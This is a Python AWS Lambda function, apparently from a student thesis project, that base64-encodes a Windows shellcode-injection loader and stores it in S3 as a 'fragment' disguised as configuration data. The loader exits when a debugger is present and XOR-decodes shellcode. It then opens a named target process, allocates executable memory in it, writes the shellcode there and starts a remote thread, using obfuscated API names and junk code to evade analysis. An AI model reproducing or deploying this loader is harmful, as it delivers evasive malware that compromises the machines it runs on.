import json
import boto3
import base64


s3 = boto3.client('s3')


def lambda_handler(event, context):
    """
    La función Chimera guarda el fragmento 3 en S3.
    El fragmento 3 es el encargado de depositar el código de inyeccion.
    
    """
    
    nombre_fragmento = "fragmento3.json"
    nombre_bucket = "tfg-typhon-bucket"
   
   
   # Código de inyeccion
    config_data = r"""    
script = f'''
import base64
import ctypes
import psutil
import sys
import time


{random.getrandbits(64)}


def {nombre_func_dec}(data, key):
    {junk()}
    decoded = base64.b64decode(data)
    return bytes([b ^ key for b in decoded])


def {nombre_func_pid}(p_name):
    {junk()}
    for p in psutil.process_iter(['pid', 'name']):
        if p.info['name'].lower() == p_name.lower():
            return p.info['pid']
    return None


if __name__ == "__main__":
    if ctypes.windll.kernel32.IsDebuggerPresent():
        sys.exit()


    time.sleep(1)


    k32 = ctypes.windll.kernel32


    h_op = getattr(k32, "{n_op}")
    h_op.restype = ctypes.c_void_p


    h_va = getattr(k32, "{n_va}")
    h_va.restype = ctypes.c_void_p
    h_va.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.c_uint32]


    h_wm = getattr(k32, "{n_wm}")
    h_wm.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p]


    h_ct = getattr(k32, "{n_ct}")
    h_ct.restype = ctypes.c_void_p
    h_ct.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p]
   
    {junk()}
   
    shellcode = {nombre_func_dec}("{texto_c}", {num_aleatorio})
    target_pid = {nombre_func_pid}("{target_proc}")
   
    if not target_pid:
        sys.exit()


    process_handle = h_op(0x1F0FFF, False, target_pid)


    remote_mem = h_va(process_handle, 0, len(shellcode), 0x3000, 0x40)
   
    h_wm(process_handle, remote_mem, shellcode, len(shellcode), None)
   
    {junk()}
    h_ct(process_handle, None, 0, remote_mem, 0, 0, None)
   
'''


exec(script)
"""
    datos_a_guardar = {
        "module_id": "3",
        "content": base64.b64encode(config_data.encode()).decode(),
        "is_bin": 0
    }
   
   # Guardar el fragmento en S3. Si hay un error, se devuelve el error 500
    try:
        s3.put_object(
            Bucket=nombre_bucket,
            Key=nombre_fragmento,
            Body=json.dumps(datos_a_guardar),
            ContentType='application/json'
        )
       
        return {
            'statusCode': 200,
            'body': json.dumps(f'[SUCCESS]{nombre_fragmento} guardado en S3')
        }
       
    except Exception as e:
        print(f"Error guardando en S3: {str(e)}")
        return {
            'statusCode': 500,
            'body': json.dumps('[ERROR] Error al guardar fragmento')
        }
